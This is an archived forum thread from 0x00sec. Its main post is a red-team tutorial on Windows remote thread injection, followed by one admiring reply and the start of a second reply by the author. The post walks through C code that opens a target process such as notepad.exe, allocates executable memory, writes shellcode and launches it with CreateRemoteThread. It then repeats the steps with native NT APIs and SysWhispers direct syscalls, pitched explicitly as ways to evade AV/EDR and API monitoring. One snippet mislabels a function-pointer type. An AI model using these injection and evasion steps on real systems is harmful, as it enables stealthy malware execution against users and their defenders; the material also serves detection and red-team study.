<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Process Injection: Remote Thread Injection or CreateRemoteThread - Malware - 0x00sec - The Home of the Hacker</title>
<meta name="description" content="In Every Red Team Operation, the goal of the Team is to Stay Stealthy and hide campaign operation from the blue team. From getting the initial access to hiding the C2 connections and exfiltrating data, they use various t&amp;hellip;">
<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
<meta name="theme-color" media="all" content="#171616">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="24399.html" />
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
<link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
<link href="../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
<link href="../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
<link href="../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
<link href="../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
<link href="../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
<link href="../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
<link href="../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
<link href="../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
<link href="../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
<link href="../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
<link href="../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
<link href="../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
<link href="../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
<link href="../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
<link rel="preload" href="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
<script defer src="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Process Injection: Remote Thread Injection or CreateRemoteThread&#39;" href="24399.rss" />
<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:image" content="https://0x00sec.s3.amazonaws.com/optimized/3X/6/3/63d7f5698bdd6f170bdafd8e2042556489cdbb85_2_1024x1020.png" />
<meta property="og:image" content="https://0x00sec.s3.amazonaws.com/optimized/3X/6/3/63d7f5698bdd6f170bdafd8e2042556489cdbb85_2_1024x1020.png" />
<meta property="og:url" content="https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399" />
<meta name="twitter:url" content="https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399" />
<meta property="og:title" content="Process Injection: Remote Thread Injection or CreateRemoteThread" />
<meta name="twitter:title" content="Process Injection: Remote Thread Injection or CreateRemoteThread" />
<meta property="og:description" content="In Every Red Team Operation, the goal of the Team is to Stay Stealthy and hide campaign operation from the blue team. From getting the initial access to hiding the C2 connections and exfiltrating data, they use various techniques and procedures to do that. The first step of every campaign is to get initial access. They use customized malware and payloads to circumvent and evade defending tools such as AVs and EDRs.  Process Injection is one of the techniques that is used to evade the defense mec..." />
<meta name="twitter:description" content="In Every Red Team Operation, the goal of the Team is to Stay Stealthy and hide campaign operation from the blue team. From getting the initial access to hiding the C2 connections and exfiltrating data, they use various techniques and procedures to do that. The first step of every campaign is to get initial access. They use customized malware and payloads to circumvent and evade defending tools such as AVs and EDRs.  Process Injection is one of the techniques that is used to evade the defense mec..." />
<meta property="og:article:section" content="Malware" />
<meta property="og:article:section:color" content="F7941D" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="4 mins 🕑" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="28 ❤" />
<meta property="article:published_time" content="2020-12-28T19:44:05+00:00" />
<meta property="og:ignore_canonical" content="true" />
</head>
<body class="crawler ">
<div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">

<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
<header>
<a href="../../index.html">
0x00sec - The Home of the Hacker
</a>
</header>
<div id="main-outlet" class="wrap" role="main">
<div id="topic-title">
<h1>
<a href="24399.html">Process Injection: Remote Thread Injection or CreateRemoteThread</a>
</h1>
<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../c/malware.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #F7941D"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">Malware</span>
</span>
</a>
<meta itemprop="position" content="1" />
</span>
</div>
</div>
<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
<meta itemprop="headline" content="Process Injection: Remote Thread Injection or CreateRemoteThread">
<meta itemprop="articleSection" content="Malware">
<meta itemprop="keywords" content>
<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
<meta itemprop="name" content="0x00sec - The Home of the Hacker">
<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
</div>
</div>
<div id="post_1" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/alion"><span itemprop="name">alion</span></a>
(ali)
</span>
<link itemprop="mainEntityOfPage" href="24399.html">
<link itemprop="image" href="https://0x00sec.s3.amazonaws.com/original/3X/6/3/63d7f5698bdd6f170bdafd8e2042556489cdbb85.png">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2020-12-28T19:44:05Z" class="post-time">
December 28, 2020, 7:44pm
</time>
<meta itemprop="dateModified" content="2020-12-30T15:38:37Z">
<span itemprop="position">1</span>
</span>
</div>
<div class="post" itemprop="articleBody">
<p>In Every Red Team Operation, the goal of the Team is to Stay Stealthy and hide campaign operation from the blue team. From getting the initial access to hiding the C2 connections and exfiltrating data, they use various techniques and procedures to do that. The first step of every campaign is to get initial access. They use customized malware and payloads to circumvent and evade defending tools such as AVs and EDRs.</p>
<p><a href="https://attack.mitre.org/techniques/T1055/" rel="noopener nofollow ugc">Process Injection</a> is one of the techniques that is used to evade the defense mechanism. Remote Thread Injection (aka CreateRemoteThread) is one of the simple and reliable sub technique. it works by injecting the shellcode (payload) into the context of another eligible process and creates a thread for that process to run the payload.</p>
<pre><code class="lang-auto">                                                                                                   
          +-------------------+                                          +-------------------+     
          |                   |                                          |                   |     
          |                   |                                          |                   |     
          |  Notepad Process  |                                          |  Malware Process  |     
          |                   |                                          |                   |     
          |                   |           1 allocating space             |                   |     
          |-------------------| &lt;--------------------------------------  |                   |     
          |     shellcode     |                                          |                   |     
          |                   |           2 writing shellcode            |                   |     
          +-------------------+ &lt;--------------------------------------  +-------------------+     
                 ^                                                         |                       
                 |                                                         |                       
                 |                                                         |                       
                 |                                                         |                       
                 v             3 creating a remote thread to run shellcode |                       
             +---------+                                                   |                       
             |         |  &lt;------------------------------------------------+                       
             | thread  |                                                                           
             |         |                                                                           
             +---------+                                                                           
                                                                                                   
</code></pre>
<p><em>figure 1</em></p>
<p>We implement remote thread injection using standard Windows APIs, native APIs, and direct syscalls. each of these implementations has its own pros and cons. the following picture shows how standard windows APIs, Native APIs, and direct syscalls work in windows architecture.</p>
<pre><code class="lang-auto">                                  +------------------------------+                                  
                                  |                              |                                  
                      +-----------|     Application Process      |----------------+                 
                      |           |                              |                |                 
                      |           +------------------------------+                |                 
                      |                           |                               |                 
                      |                           |                               |                 
                      |                           |                               |                 
                      |                           | Standard Windows API         |                 
                      |                           |                               |                 
                      |                           |                               |                 
                      |                           v                               |                 
                      |           +------------------------------+                |                 
                      |           |                              |                |                 
       Native API     |           |          kernel32.dll        |                |                 
                      |           |                              |                |                 
                      |           +------------------------------+                |  Direct Syscalls
                      |                           |                               |                 
                      |                           |                               |                 
                      |                           |                               |                 
                      |                           |                               |                 
                      |                           |                               |                 
                      |                           |                               |                 
                      |                           v                               |                 
                      |           +------------------------------+                |                 
                      |           |                              |                |                 
                      +---------&gt; |           Ntdll.dll          |                |                 
                                  |                              |                |                 
 User-Mode                        +------------------------------+                |                 
                                                  |                               |                 
                                                  |                               |                 
 -------------------------------------------------|-------------------------------|-----------------
                                                  |                               |                 
                                                  |                               |                 
 Kernel-Mode                                      |                               |                 
                                  +---------------v--------------+                |                 
                                  |                              |                |                 
                                  |         ntoskrnl.exe         | &lt;--------------+                 
                                  |                              |                                  
                                  +------------------------------+                                  
</code></pre>
<p><em>figure 2</em></p>
<h2>Standard Windows APIs</h2>
<h3>pros:</h3>
<ul>
<li>easy to use</li>
</ul>
<h3>cons:</h3>
<ul>
<li>detectable by most AV/EDRs</li>
</ul>
<p>we start by using standard Windows APIs as it is simpler than two other ways. First, we need to find our target process ID. We create a function called <code>find_process</code> that gets a process name and it uses <a href="https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot" rel="noopener nofollow ugc">CreateToolhelp32Snapshot</a> API to get the list of current processes and uses <a href="https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first" rel="noopener nofollow ugc">Process32First</a> and <a href="https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next" rel="noopener nofollow ugc">Process32Next</a> to go through them one by one and compare the name of the processes with our target process. <strong>Process32First</strong> and <strong>Process32Next</strong> APIs get a pointer to <a href="https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32" rel="noopener nofollow ugc">PROCESSENTRY32</a> struct that could hold information about processes like its name and id. If it succeeds to find the process it returns its process ID.</p>
<pre><code class="lang-auto">DWORD find_process(char *process_name){

	PROCESSENTRY32 process_entry;
	process_entry.dwSize = sizeof(PROCESSENTRY32);

	//get the list of processes
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	//check processes to find TARGET_PROCESS_NAME
	if (Process32First(snapshot, &amp;process_entry) == TRUE){
		
        	while (Process32Next(snapshot, &amp;process_entry) == TRUE){
        		if (stricmp(process_entry.szExeFile, process_name) == 0){  
				    CloseHandle(snapshot);
				    return process_entry.th32ProcessID;
            	}
        	}
    	}

	CloseHandle(snapshot);
	return 0;
}
</code></pre>
<p>for the next step, we need to open our target process using the <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess" rel="noopener nofollow ugc">OpenProcess</a> function. We pass our parameters including the target process id that we get from the previous step and it returns a handle to that process.</p>
<pre><code class="lang-auto">HANDLE target_process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_process_id);
</code></pre>
<p>now we need to allocate space for our shellcode in the target process using the <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex" rel="noopener nofollow ugc">VirtualAllocEx</a> function. we should allocate this space with <strong>PAGE_EXECUTE_READWRITE</strong> (Read, Write, Execute) permission. this function returns the base address of the allocated region.</p>
<pre><code class="lang-auto"> LPVOID remote_process_buffer = VirtualAllocEx(target_process_handle, NULL, sizeof(buf), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
</code></pre>
<p>now we should write our shellcode into our allocated memory region using the <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory" rel="noopener nofollow ugc">WriteProcessMemory</a> function.</p>
<pre><code class="lang-auto">WriteProcessMemory(target_process_handle, remote_process_buffer, buf, sizeof(buf), NULL);
</code></pre>
<p>after all, it’s time to create a thread in the target process and run the shellcode that we previously wrote into a memory page. we use the <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread" rel="noopener nofollow ugc">CreateRemoteThread</a> function. we should also pass 0 as the <strong>dwCreationFlags</strong> parameter to run the thread immediately after creation.</p>
<pre><code class="lang-auto">CreateRemoteThread(target_process_handle, NULL, 0,(LPTHREAD_START_ROUTINE) remote_process_buffer,NULL,0, NULL);
</code></pre>
<p>to compile the code in kali, we use <strong>MinGW</strong>.</p>
<pre><code class="lang-auto">x86_64-w64-mingw32-gcc main.c -o rti.exe
</code></pre>
<p>we send the output to our windows machine and run it. if we open <strong>process hacker</strong> and take a look at the <strong>notepad.exe</strong> process. in the memory section there is only one memory page with RWX permission which is suspicious. if we open it we can see our shellcode inside it.</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/6/3/63d7f5698bdd6f170bdafd8e2042556489cdbb85.png" data-download-href="/uploads/short-url/effXrKa174oyvibfBufispBnHCJ.png?dl=1" title="process-hacker-notepad" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/6/3/63d7f5698bdd6f170bdafd8e2042556489cdbb85_2_501x500.png" alt="process-hacker-notepad" data-base62-sha1="effXrKa174oyvibfBufispBnHCJ" width="501" height="500" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/6/3/63d7f5698bdd6f170bdafd8e2042556489cdbb85_2_501x500.png, https://0x00sec.s3.amazonaws.com/optimized/3X/6/3/63d7f5698bdd6f170bdafd8e2042556489cdbb85_2_751x750.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/6/3/63d7f5698bdd6f170bdafd8e2042556489cdbb85_2_1002x1000.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/6/3/63d7f5698bdd6f170bdafd8e2042556489cdbb85_2_10x10.png"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use xlink:href="#far-image"></use></svg><span class="filename">process-hacker-notepad</span><span class="informations">1436×1431 334 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use xlink:href="#discourse-expand"></use></svg></div></a></div><br>
<em>image 1</em></p>
<h2>Native API</h2>
<h3>pros:</h3>
<ul>
<li>bypass some of the AV/EDRs</li>
</ul>
<h3>cons:</h3>
<ul>
<li>hard to use</li>
<li>still detectable by most AV/EDRs</li>
<li>may not work on all windows versions</li>
</ul>
<p>In order to interact with the operating system, programmers use Standard APIs (Win 32 APIs) that are recommended by Microsoft. Standard Windows APIs are a kind of wrapper for Native APIs. Native APIs or Undocumented APIs could be found in the ntdll.dll library. Microsoft doesn’t recommend using these APIs. if you look at the second diagram you can see how these APIs are working. native APIs also interact with os kernel using syscalls. Microsoft uses this architecture because it can change the OS kernel without affecting the standard APIs.</p>
<p>Native APIs are also called undocumented APIs because you can’t usually find official documentats to use them. we can find a way of using them mostly by seeing other people’s code, unofficial documents, or researching around them to see how they work. most of these APIs names start with Nt or Zw.</p>
<p>In the previous section, we used standard APIs to do our job. here we go one layer deeper and use native APIs. we have a couple of more steps to use NTAPIS. for using Native APIs. first, we need to load the ntdll.dll into our malware process. then we should define function pointers with the exact same format as the original function that we want to use, and export the base address of these functions to initialize these pointers.</p>
<p>for loading ntdll.dll or any other dll dynamically into our running process, we use the <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryw" rel="noopener nofollow ugc">LoadLibraryW</a> function and it returns a handle to that library.</p>
<pre><code class="lang-auto">HMODULE hNtdll = LoadLibraryW(L"ntdll");
</code></pre>
<p>then we define our function pointer type and get the base address of the function using the <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress" rel="noopener nofollow ugc">GetProcAddress</a> function and assign it to the pointer. here is the example for <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntopenprocess" rel="noopener nofollow ugc">NtOpenProcess</a>.</p>
<pre><code class="lang-auto">typedef NTSTATUS(NTAPI* pNtOpenProcess)(PHANDLE ProcessHandle, ACCESS_MASK AccessMask, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientID);
pNtOpenProcess NtOpenProcess = (pNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
</code></pre>
<p>as you can see we defined our function type with the same parameters as the <strong>NtOpenProcess</strong> function. you should do this for all <strong>NtWriteVirtualMemory</strong> , <strong>NtAllocateVirtualMemory</strong> , <strong>NtCreateThreadEx</strong> functions. for finding the parameter and structure of an undocumented api you can use <a href="http://undocumented.ntinternals.net/" rel="noopener nofollow ugc">http://undocumented.ntinternals.net/</a>. but you may not find all the function definitions in it. you can search for it and see other people’s codes or even looking inside the ntdll.dll library to see how it exactly works.</p>
<h3>NtOpenProcess</h3>
<p>like the previous section, we start by opening our target process but this time using <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntopenprocess" rel="noopener nofollow ugc">NtOpenProcess</a>. this function does not return a Handle to our target process but we need to pass a handle pointer as the first argument(pass by reference). we should also pass a pointer to an <a href="https://docs.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_object_attributes" rel="noopener nofollow ugc">OBJECT_ATTRIBUTES</a> structure and a pointer to <strong>Client ID</strong> struct so let’s define them. we should also initialize <strong>OBJECT_ATTRIBUTES</strong> using <a href="https://docs.microsoft.com/en-us/windows/win32/api/ntdef/nf-ntdef-initializeobjectattributes" rel="noopener nofollow ugc">InitializeObjectAttributes</a> macro and define <strong>UNICODE_STRING</strong> struct.</p>
<pre><code class="lang-auto">#define InitializeObjectAttributes(p,n,a,r,s) { \
(p)-&gt;Length = sizeof(OBJECT_ATTRIBUTES); \
(p)-&gt;RootDirectory = (r); \
(p)-&gt;Attributes = (a); \
(p)-&gt;ObjectName = (n); \
(p)-&gt;SecurityDescriptor = (s); \
(p)-&gt;SecurityQualityOfService = NULL; \
}

typedef struct _CLIENT_ID
{
	PVOID UniqueProcess;
	PVOID UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;


typedef struct _OBJECT_ATTRIBUTES {
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES ;


OBJECT_ATTRIBUTES oa;
InitializeObjectAttributes(&amp;oa, NULL,0,NULL,NULL);
CLIENT_ID ci = { (HANDLE)procid, NULL };
</code></pre>
<p>now we can use <strong>NtOpenProcess</strong></p>
<pre><code class="lang-auto">NtOpenProcess(&amp;target_process_handle,PROCESS_ALL_ACCESS, &amp;oa, &amp;ci);
</code></pre>
<h3>NtAllocateVirtualMemory</h3>
<p>we allocate memory in target process using the <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory" rel="noopener nofollow ugc">NtAllocateVirtualMemory</a> function. we define the function prototype.</p>
<pre><code class="lang-auto">typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
</code></pre>
<p>then we get the base address of the function.</p>
<pre><code class="lang-auto">pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
</code></pre>
<p>and we call it</p>
<pre><code class="lang-auto">NtAllocateVirtualMemory(target_process_handle, &amp;remote_process_buffer, 0,&amp;buf_len ,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
</code></pre>
<p>we passed a void pointer named <strong>remote_process_buffer</strong> that will be the base address of the allocated space.</p>
<h3>NtWriteVirtualMemory</h3>
<p>we define <a href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FMemory%20Management%2FVirtual%20Memory%2FNtWriteVirtualMemory.html" rel="noopener nofollow ugc">NtWriteVirtualMemory</a> function prototype like previous steps. we should pass our shellcode, the length of the shellcode, and the base address of the allocated space as arguments.</p>
<pre><code class="lang-auto">typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten OPTIONAL);
pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
NtWriteVirtualMemory(target_process_handle, remote_process_buffer, buf, buf_len, NULL);
</code></pre>
<h3>NtCreateThreadEx</h3>
<p>now it’s time to create a thread in our target process and run our shellcode. we use <strong>NtCreateThreadEx</strong> to create a remote thread in the target process and run our shellcode. we should pass 0 as the <strong>CreateFlag</strong> parameter to run the thread immediately after creation and 0x1FFFFF (PROCESS_ALL_ACCESS) as the <strong>DesiredAccess</strong> parameter. to see the function prototype, you can look <a href="https://github.com/processhacker/processhacker/blob/753a395d55634f5e5483c517219414c2ecacfc23/phnt/include/ntpsapi.h#L1814" rel="noopener nofollow ugc">here</a>.</p>
<pre><code class="lang-auto">NtCreateThreadEx(&amp;thread_handle, 0x1FFFFF, NULL, target_process_handle,(LPTHREAD_START_ROUTINE)remote_process_buffer,NULL, FALSE, NULL, NULL, NULL, NULL);
</code></pre>
<p>that’s it for Native APIs. let’s go one step deeper and use syscalls.</p>
<h2>Direct Syscalls</h2>
<h3>pros:</h3>
<ul>
<li>undetectable by all of the API monitoring tools that work on user-space</li>
</ul>
<h3>cons:</h3>
<ul>
<li>May not work on all windows versions</li>
<li>hard to use</li>
</ul>
<p>In the previous steps, any API monitoring application and EDRs could detect our API calls and ruin our operation. now if we use direct syscalls nothing in userland can detect our API calls. but as <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon" rel="noopener nofollow ugc">sysmon</a> works as a driver in kernel space we can’t do anything about it. so, it is strongly recommended to use sysmon.</p>
<p>One of the disadvantages of using syscalls is that their work is dependent on the version of OS and our code may not work on different windows versions. However, by using a great tool like <a href="https://github.com/jthuraisamy/SysWhispers" rel="noopener nofollow ugc">SysWhisper</a> we can generate syscalls for different windows versions. you can run the following command to generate syscalls for our desired functions for windows 10.</p>
<pre><code class="lang-auto">syswhispers.py --function NtCreateProcess,NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -o syscall --versions 10
</code></pre>
<p>this command generates two output files <strong>syscall.asm</strong> and <strong>syscall.h</strong> that we add to our visual studio project. then we should enable <a href="https://docs.microsoft.com/en-us/cpp/assembler/masm/masm-for-x64-ml64-exe?view=msvc-160" rel="noopener nofollow ugc">MASM</a> in the project and include the header file in our main code.</p>
<p>afterward using the functions is like Native APIs but here we don’t need to load ntdll.dll, get the base address of the functions, and defining function prototypes. I think SysWhisper has made it really easy to utilize syscalls.</p>
<p>You can find the codes for this post on my <a href="https://github.com/AlionGreen/remote-thread-injection" rel="noopener nofollow ugc">Github</a>.</p>
<h2>Credit:</h2>
<p>thanks, <a href="https://twitter.com/0x00dtm" rel="noopener nofollow ugc">@0x00dtm</a> for guiding me through Native APIs and Syscalls. it would be much harder without his help.</p>
<h2>References:</h2>
<aside class="onebox allowlistedgeneric">
<header class="source">
<a href="https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/" target="_blank" rel="noopener nofollow ugc">outflank.nl</a>
</header>
<article class="onebox-body">
<h3><a href="https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/" target="_blank" rel="noopener nofollow ugc">Red Team Tactics: Combining Direct System Calls and sRDI to bypass AV/EDR |...</a></h3>
<p>In this blog post we will explore the use of direct system calls, restore hooked API calls and ultimately combine this with a shellcode injection technique called&nbsp;sRDI. We will combine these techniques in proof of concept code which can be used...</p>
</article>
<div class="onebox-metadata">
</div>
<div style="clear: both"></div>
</aside>
<p><a href="https://www.ired.team/offensive-security/code-injection-process-injection/process-injection/" class="onebox" target="_blank" rel="noopener nofollow ugc">https://www.ired.team/offensive-security/code-injection-process-injection/process-injection/</a></p>
<aside class="onebox allowlistedgeneric">
<header class="source">
<img src="https://0x00sec.s3.amazonaws.com/original/3X/9/f/9f230528ee350a1335deb4fe0b3db3b3c25fa147.png" class="site-icon" width="200" height="200">
<a href="https://blog.dylan.codes/defending-your-malware/" target="_blank" rel="noopener nofollow ugc" title="07:34PM - 11 August 2020">batsec – 11 Aug 20</a>
</header>
<article class="onebox-body">
<img "https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/src" class="thumbnail" width height>
<h3><a href="https://blog.dylan.codes/defending-your-malware/" target="_blank" rel="noopener nofollow ugc">Defending Your Malware</a></h3>
<p>Malware is an important part of an engagement, though as many security solutions are now evolving past rudimentary signature comparisons to using more advanced techniques to detect malicious activity, it is important that we as attackers understand...</p>
</article>
<div class="onebox-metadata">
</div>
<div style="clear: both"></div>
</aside>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="13" />
<span class="post-likes">13 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_2" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/pry0cc"><span itemprop="name">pry0cc</span></a>
(Leader &amp; Offsec Engineer &amp; Forum Daddy)
</span>
<link itemprop="mainEntityOfPage" href="24399.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2020-12-29T13:45:55Z" class="post-time">
December 29, 2020, 1:45pm
</time>
<meta itemprop="dateModified" content="2020-12-29T13:45:55Z">
<span itemprop="position">2</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Awesome first article!!!</p>
<p>I really like how you explained how all the different types of API and how they link together - you broke it down in a really nice readable way! I learned a lot from reading this byte-size post!</p>
<p>Great job!</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="4" />
<span class="post-likes">4 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_3" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/alion"><span itemprop="name">alion</span></a>
(ali)
</span>
<link itemprop="mainEntityOfPage" href="24399.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2020-12-29T18:42:13Z" class="post-time">
December 29, 2020, 6:42pm
</time>
